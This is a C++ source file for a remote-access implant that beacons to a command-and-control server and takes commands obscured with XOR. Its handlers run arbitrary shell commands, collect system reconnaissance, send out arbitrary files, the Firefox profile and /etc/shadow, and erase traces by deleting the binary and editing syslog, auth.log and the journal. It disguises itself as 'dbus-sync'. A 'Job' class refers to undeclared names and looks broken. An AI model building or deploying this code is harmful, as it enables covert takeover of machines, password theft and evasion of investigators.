#include <string>
#include <vector>
#include <map>
#include <sstream>
#include <fstream>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <algorithm>
#include <functional>
#include <iostream>
#include <random>

#ifdef _WIN32
  #include <windows.h>
  #include <winhttp.h>
  #pragma comment(lib, "winhttp.lib")
#else
  #include <unistd.h>
  #include <sys/types.h>
  #include <sys/socket.h>
  #include <sys/wait.h>
  #include <netdb.h>
  #include <arpa/inet.h>
  #include <cstdio>
#endif

static const std::string DEFAULT_C2   = "http://127.0.0.1:8080";
static const std::string INSTALL_PATH = "/usr/bin/dbus-sync";
static const uint8_t     XOR_KEY      = 0x67;

static const std::map<std::string, int> TIME_MULTIPLIERS = {
    {"secs", 1}, {"mins", 60}, {"hours", 3600}
};

static std::string generateId() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<uint32_t> dist(0, 0xFFFFFF);
    uint32_t r = dist(gen);
    char buf[32];
#ifdef _WIN32
    int pid = static_cast<int>(GetCurrentProcessId());
#else
    int pid = static_cast<int>(getpid());
#endif
    snprintf(buf, sizeof(buf), "%d-%06x", pid, r);
    return std::string(buf);
}

static std::vector<uint8_t> base64UrlDecode(const std::string& input) {
    std::string b64 = input;
    for (auto& c : b64) {
        if (c == '-') c = '+';
        else if (c == '_') c = '/';
    }
    while (b64.size() % 4) b64 += '=';

    static const std::string chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<uint8_t> result;
    int val = 0, bits = -8;
    for (char c : b64) {
        if (c == '=') break;
        size_t pos = chars.find(c);
        if (pos == std::string::npos) continue;
        val = (val << 6) | static_cast<int>(pos);
        bits += 6;
        if (bits >= 0) {
            result.push_back(static_cast<uint8_t>((val >> bits) & 0xFF));
            bits -= 8;
        }
    }
    return result;
}

static std::vector<char> xorEncodeFile(const std::vector<char>& data, const std::vector<char>& key) {
    std::vector<char> out(data.size());
    for (size_t i = 0; i < data.size(); i++)
        out[i] = data[i] ^ key[i % key.size()];
    return out;
}

static std::vector<char> xorDecodeFile(const std::vector<char>& data, const std::vector<char>& key) {
    return xorEncodeFile(data, key);
}

static std::string xorDecode(const std::string& encoded) {
    auto raw = base64UrlDecode(encoded);
    std::string result;
    result.reserve(raw.size());
    for (auto b : raw) result += static_cast<char>(b ^ XOR_KEY);
    return result;
}

static std::map<std::string, std::string>
decodeDict(const std::map<std::string, std::string>& d) {
    std::map<std::string, std::string> result;
    for (const auto& [k, v] : d) result[xorDecode(k)] = xorDecode(v);
    return result;
}

static std::map<std::string, std::string> parseJsonDict(const std::string& json) {
    std::map<std::string, std::string> result;

    auto parseString = [&](size_t& pos) -> std::string {
        while (pos < json.size() && isspace(json[pos])) pos++;
        if (pos >= json.size() || json[pos] != '"') return "";
        pos++;
        std::string s;
        while (pos < json.size() && json[pos] != '"') {
            if (json[pos] == '\\' && pos + 1 < json.size()) {
                pos++;
                switch (json[pos]) {
                    case '"':  s += '"';  break;
                    case '\\': s += '\\'; break;
                    case 'n':  s += '\n'; break;
                    case 't':  s += '\t'; break;
                    default:   s += json[pos]; break;
                }
            } else {
                s += json[pos];
            }
            pos++;
        }
        if (pos < json.size()) pos++;
        return s;
    };

    size_t i = json.find('{');
    if (i == std::string::npos) return result;
    i++;

    while (i < json.size()) {
        while (i < json.size() && isspace(json[i])) i++;
        if (i >= json.size() || json[i] == '}') break;
        std::string key = parseString(i);
        while (i < json.size() && (isspace(json[i]) || json[i] == ':')) i++;
        std::string value = parseString(i);
        if (!key.empty()) result[key] = value;
        while (i < json.size() && (isspace(json[i]) || json[i] == ',')) i++;
    }
    return result;
}

static void sleepSec(int seconds) {
#ifdef _WIN32
    Sleep(static_cast<DWORD>(seconds) * 1000);
#else
    sleep(static_cast<unsigned>(seconds));
#endif
}

struct ParsedUrl {
    std::string host;
    int         port = 80;
    std::string path;
    bool        useTls = false;
};

static ParsedUrl parseUrl(const std::string& url) {
    ParsedUrl p;
    std::string work = url;

    if (work.rfind("https://", 0) == 0) {
        p.useTls = true;
        p.port   = 443;
        work     = work.substr(8);
    } else if (work.rfind("http://", 0) == 0) {
        work = work.substr(7);
    }

    size_t slash = work.find('/');
    std::string hostPort = (slash != std::string::npos) ? work.substr(0, slash) : work;
    p.path = (slash != std::string::npos) ? work.substr(slash) : "/";

    size_t colon = hostPort.find(':');
    if (colon != std::string::npos) {
        p.host = hostPort.substr(0, colon);
        p.port = std::stoi(hostPort.substr(colon + 1));
    } else {
        p.host = hostPort;
    }
    return p;
}

#ifdef _WIN32

static std::wstring toWide(const std::string& s) {
    if (s.empty()) return {};
    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    std::wstring ws(len, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &ws[0], len);
    return ws;
}

static std::string httpGet(const std::string& url, const std::string& extraHeader = "") {
    ParsedUrl p = parseUrl(url);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "";

    HINTERNET hConnect = WinHttpConnect(hSession, toWide(p.host).c_str(),
                                        static_cast<INTERNET_PORT>(p.port), 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }

    DWORD flags = p.useTls ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", toWide(p.path).c_str(),
                                            nullptr, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    if (p.useTls) {
        DWORD secFlags = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    }
    DWORD timeout = 30000;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    LPCWSTR hdrs = WINHTTP_NO_ADDITIONAL_HEADERS;
    std::wstring whdr;
    if (!extraHeader.empty()) {
        whdr = toWide(extraHeader) + L"\r\n";
        hdrs = whdr.c_str();
    }

    if (!WinHttpSendRequest(hRequest, hdrs, (DWORD)-1,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, nullptr)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    std::string body;
    DWORD avail = 0;
    while (WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
        std::vector<char> buf(avail);
        DWORD read = 0;
        WinHttpReadData(hRequest, buf.data(), avail, &read);
        body.append(buf.data(), read);
    }
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return body;
}

static bool httpPost(const std::string& url, const std::string& data,
                     const std::string& extraHeader = "") {
    ParsedUrl p = parseUrl(url);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, toWide(p.host).c_str(),
                                        static_cast<INTERNET_PORT>(p.port), 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    DWORD flags = p.useTls ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", toWide(p.path).c_str(),
                                            nullptr, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    if (p.useTls) {
        DWORD secFlags = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    }
    DWORD timeout = 60000;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    std::wstring headers = L"Content-Type: application/octet-stream\r\n";
    if (!extraHeader.empty()) headers += toWide(extraHeader) + L"\r\n";

    bool ok = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)-1,
                                 (LPVOID)data.c_str(), (DWORD)data.size(),
                                 (DWORD)data.size(), 0)
           && WinHttpReceiveResponse(hRequest, nullptr);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return ok;
}

#else

static std::string httpRequest(const std::string& method, const ParsedUrl& p,
                               const std::string& body = "",
                               const std::string& extraHeader = "") {
    struct addrinfo hints{}, *res = nullptr;
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    std::string portStr = std::to_string(p.port);
    if (getaddrinfo(p.host.c_str(), portStr.c_str(), &hints, &res) != 0 || !res)
        return "";

    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock < 0) { freeaddrinfo(res); return ""; }

    struct timeval tv;
    tv.tv_sec  = 30;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(sock, res->ai_addr, res->ai_addrlen) < 0) {
        close(sock);
        freeaddrinfo(res);
        return "";
    }
    freeaddrinfo(res);

    std::ostringstream req;
    req << method << " " << p.path << " HTTP/1.1\r\n"
        << "Host: " << p.host << ":" << p.port << "\r\n"
        << "User-Agent: Mozilla/5.0\r\n"
        << "Connection: close\r\n";
    if (!body.empty())
        req << "Content-Length: " << body.size() << "\r\n"
            << "Content-Type: application/octet-stream\r\n";
    if (!extraHeader.empty())
        req << extraHeader << "\r\n";
    req << "\r\n";
    if (!body.empty()) req << body;

    std::string raw = req.str();
    send(sock, raw.c_str(), raw.size(), 0);

    std::string response;
    char buf[4096];
    ssize_t n;
    while ((n = recv(sock, buf, sizeof(buf), 0)) > 0)
        response.append(buf, n);
    close(sock);

    size_t hdrEnd = response.find("\r\n\r\n");
    if (hdrEnd == std::string::npos) return "";
    return response.substr(hdrEnd + 4);
}

static std::string httpGet(const std::string& url, const std::string& extraHeader = "") {
    return httpRequest("GET", parseUrl(url), "", extraHeader);
}

static bool httpPost(const std::string& url, const std::string& data,
                     const std::string& extraHeader = "") {
    std::string resp = httpRequest("POST", parseUrl(url), data, extraHeader);
    return !resp.empty();
}

#endif

#ifdef _WIN32

static std::string executeCapture(const std::string& cmdLine) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength        = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE hReadOut = nullptr, hWriteOut = nullptr;
    CreatePipe(&hReadOut, &hWriteOut, &sa, 0);
    SetHandleInformation(hReadOut, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{};
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdOutput = hWriteOut;
    si.hStdError  = hWriteOut;

    PROCESS_INFORMATION pi{};
    std::vector<char> buf(cmdLine.begin(), cmdLine.end());
    buf.push_back('\0');

    if (!CreateProcessA(nullptr, buf.data(), nullptr, nullptr, TRUE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(hReadOut);
        CloseHandle(hWriteOut);
        return "";
    }
    CloseHandle(hWriteOut);
    WaitForSingleObject(pi.hProcess, 120000);

    std::string output;
    char rbuf[4096];
    DWORD bytesRead;
    while (ReadFile(hReadOut, rbuf, sizeof(rbuf), &bytesRead, nullptr) && bytesRead > 0)
        output.append(rbuf, bytesRead);

    CloseHandle(hReadOut);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return output;
}

static void executeFireAndForget(const std::string& cmdLine) {
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    std::vector<char> buf(cmdLine.begin(), cmdLine.end());
    buf.push_back('\0');
    if (CreateProcessA(nullptr, buf.data(), nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 120000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

#else

static std::string executeCapture(const std::string& cmdLine) {
    FILE* fp = popen(cmdLine.c_str(), "r");
    if (!fp) return "";
    std::string output;
    char buf[4096];
    while (fgets(buf, sizeof(buf), fp))
        output += buf;
    pclose(fp);
    return output;
}

static void executeFireAndForget(const std::string& cmdLine) {
    pid_t pid = fork();
    if (pid == 0) {
        execl("/bin/sh", "sh", "-c", cmdLine.c_str(), nullptr);
        _exit(1);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
    }
}

#endif

class Job {
    public:
        int jobID;
        int srcID;
        int destID;
        char flag;
        char gateway;
        std::string type;
        std::vector<std::byte> data;

        void decode(fs::path target) {
            std::ifstream ifs(target, std::ios::binary);
            std::vector<char> byteData((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());            
            int size = byteData.size();
            byteData = xorDecodeFile(byteData, xorKey);
            std::memcpy(&jobID, &byteData[0], sizeof(int));
            std::memcpy(&srcID, &byteData[4], sizeof(int));
            std::memcpy(&destID, &byteData[8], sizeof(int));
            std::memcpy(&flag, &byteData[12], sizeof(char));
            std::memcpy(&gateway, &byteData[13], sizeof(char));
            type = std::string(&byteData[14], 10);
            data.resize(size - 24);
            std::memcpy(&data[0], &byteData[24], size - 24);
        }

        void encode(fs::path target) {
            std::vector<char> byteData(24 + data.size());
            std::memcpy(&byteData[0], &jobID, sizeof(int));
            std::memcpy(&byteData[4], &srcID, sizeof(int));
            std::memcpy(&byteData[8], &destID, sizeof(int));
            std::memcpy(&byteData[12], &flag, sizeof(char));
            std::memcpy(&byteData[13], &gateway, sizeof(char));
            std::memcpy(&byteData[14], type.data(), 10);
            std::memcpy(&byteData[24], data.data(), data.size());
            byteData = xorEncodeFile(byteData, xorKey);
            std::ofstream ofs(target, std::ios::binary | std::ios::trunc);
            ofs.write(byteData.data(), byteData.size());
        }
};

class Implant {
public:
    explicit Implant(const std::string& c2Url) : m_c2Url(c2Url), m_id(generateId()) {
        while (!m_c2Url.empty() && m_c2Url.back() == '/') m_c2Url.pop_back();
        m_idHeader = "X-Id: " + m_id;
    }

    void run() {
        while (m_running) {
            auto cmd = beacon();
            if (!cmd.empty()) dispatch(cmd);
            sleepSec(m_sleepInterval);
        }
    }

private:
    using CmdMap = std::map<std::string, std::string>;

    CmdMap beacon() {
        std::string body = httpGet(m_c2Url, m_idHeader);
        if (body.empty()) return {};
        auto encoded = parseJsonDict(body);
        if (encoded.empty()) return {};
        return decodeDict(encoded);
    }

    void dispatch(const CmdMap& cmd) {
        std::string type = "SLEEP";
        auto it = cmd.find("type");
        if (it != cmd.end()) type = it->second;

        static const std::map<std::string,
            void (Implant::*)(const CmdMap&)> handlers = {
            {"SLEEP",           &Implant::handleSleep},
            {"SHUTDOWN",        &Implant::handleShutdown},
            {"EXECUTE_COMMAND", &Implant::handleExecuteCommand},
            {"RECON",           &Implant::reconBundle},
            {"EXFIL",           &Implant::fileExfil},
            {"SELF_DESTRUCT",   &Implant::selfDestruct},
            {"FIREFOX_EXFIL",   &Implant::firefoxExfil},
            {"PASSWD_EXFIL",    &Implant::ubuntuPassExfil},
        };

        auto h = handlers.find(type);
        if (h != handlers.end())
            (this->*(h->second))(cmd);
        else
            handleSleep(cmd);
    }

    void handleSleep(const CmdMap& cmd) {
        int duration    = 10;
        std::string unit = "secs";

        auto itD = cmd.find("duration");
        if (itD != cmd.end()) {
            try { duration = std::stoi(itD->second); }
            catch (...) { duration = 10; }
        }
        auto itU = cmd.find("interval");
        if (itU != cmd.end()) unit = itU->second;

        int multiplier = 1;
        auto itM = TIME_MULTIPLIERS.find(unit);
        if (itM != TIME_MULTIPLIERS.end()) multiplier = itM->second;

        m_sleepInterval = duration * multiplier;
    }

    void handleShutdown(const CmdMap&) {
        m_running = false;
    }

    void handleExecuteCommand(const CmdMap& cmd) {
        auto itShell = cmd.find("shell");
        std::string shell = (itShell != cmd.end()) ? itShell->second : "bash";

        auto itCmd = cmd.find("command");
        if (itCmd == cmd.end() || itCmd->second.empty()) return;
        const std::string& command = itCmd->second;

        std::string cmdLine;
#ifdef _WIN32
        if (shell == "powershell")
            cmdLine = "powershell.exe -NoProfile -NonInteractive -Command " + command;
        else if (shell == "cmd")
            cmdLine = "cmd.exe /c " + command;
        else
            cmdLine = "powershell.exe -NoProfile -NonInteractive -Command " + command;
#else
        if (shell == "bash")
            cmdLine = "/bin/bash -c '" + command + "'";
        else if (shell == "sh")
            cmdLine = "/bin/sh -c '" + command + "'";
        else
            cmdLine = "/bin/bash -c '" + command + "'";
#endif

        std::string output = executeCapture(cmdLine);
        httpPost(m_c2Url + "/cmd", output, m_idHeader);
    }

    void selfDestruct(const CmdMap&) {
#ifdef _WIN32
        m_running = false;
#else
        executeFireAndForget("rm -f " + INSTALL_PATH);

        const char* logs[] = {"/var/log/syslog", "/var/log/auth.log"};
        for (const char* log : logs)
            executeFireAndForget(std::string("sed -i '/dbus-sync/d' ") + log);

        executeFireAndForget("journalctl --vacuum-time=0 --identifier=dbus-sync");
        std::exit(0);
#endif
    }

    void reconBundle(const CmdMap&) {
        struct ReconCmd { const char* label; const char* cmd; };
        static const ReconCmd commands[] = {
            {"HOSTNAME:",                "hostname"},
            {"OS:",                      "uname -a"},
            {"OS RELEASE:",              "cat /etc/os-release"},
            {"CURRENT USER:",            "whoami"},
            {"USER ID:",                 "id"},
            {"SUDO PRIVILEGES:",         "sudo -l"},
            {"ALL USERS:",               "cat /etc/passwd"},
            {"LOGGED IN USERS:",         "who"},
            {"NETWORK INTERFACES:",      "ip a || ifconfig"},
            {"OPEN PORTS:",              "netstat -tulpn"},
            {"ROUTING TABLE:",           "ip route"},
            {"RUNNING PROCESSES:",       "ps aux"},
            {"INSTALLED SOFTWARE:",      "dpkg -l"},
            {"CRONTABS:",               "crontab -l; ls /etc/cron*"},
            {"ENVIRONMENT:",             "printenv"},
            {"RECENTLY ACCESSED FILES:", "find /home -atime -7 -type f"},
        };

        std::string output;
        for (const auto& rc : commands) {
            output += rc.label;
            output += "\n";
            output += executeCapture(rc.cmd);
            output += "\n";
        }

        httpPost(m_c2Url + "/recon", output, m_idHeader);
    }

    void fileExfil(const CmdMap& cmd) {
        auto it = cmd.find("path");
        if (it == cmd.end()) return;
        const std::string& path = it->second;

        std::ifstream file(path, std::ios::binary);
        if (!file) return;

        std::string data((std::istreambuf_iterator<char>(file)),
                          std::istreambuf_iterator<char>());

        httpPost(m_c2Url + "/file", data, m_idHeader + "\r\nX-Filename: " + path);
    }

    void firefoxExfil(const CmdMap&) {
        std::string dir = executeCapture(
            "ls -l ~/.mozilla/firefox | sort -k 2nr | head -n 2 "
            "| tail -n 1 | tr -s ' ' | cut -d ' ' -f 9");

        while (!dir.empty() && (dir.back() == '\n' || dir.back() == '\r' || dir.back() == ' '))
            dir.pop_back();
        if (dir.empty()) return;

        std::string home = std::getenv("HOME") ? std::getenv("HOME") : "";
        std::string path = home + "/.mozilla/firefox/" + dir;

        std::ifstream file(path, std::ios::binary);
        if (!file) return;
        std::string data((std::istreambuf_iterator<char>(file)),
                          std::istreambuf_iterator<char>());
        httpPost(m_c2Url + "/file", data, m_idHeader + "\r\nX-Filename: " + path);
    }

    void ubuntuPassExfil(const CmdMap&) {
        std::string path = "/etc/shadow";
        std::ifstream file(path, std::ios::binary);
        if (!file) return;
        std::string data((std::istreambuf_iterator<char>(file)),
                          std::istreambuf_iterator<char>());
        httpPost(m_c2Url + "/file", data, m_idHeader + "\r\nX-Filename: " + path);
    }

    std::string m_c2Url;
    std::string m_id;
    std::string m_idHeader;
    bool        m_running       = true;
    int         m_sleepInterval = 10;
};

int main(int argc, char* argv[]) {
    std::string c2Url = (argc > 1) ? argv[1] : DEFAULT_C2;
    Implant implant(c2Url);
    implant.run();
    return 0;
}
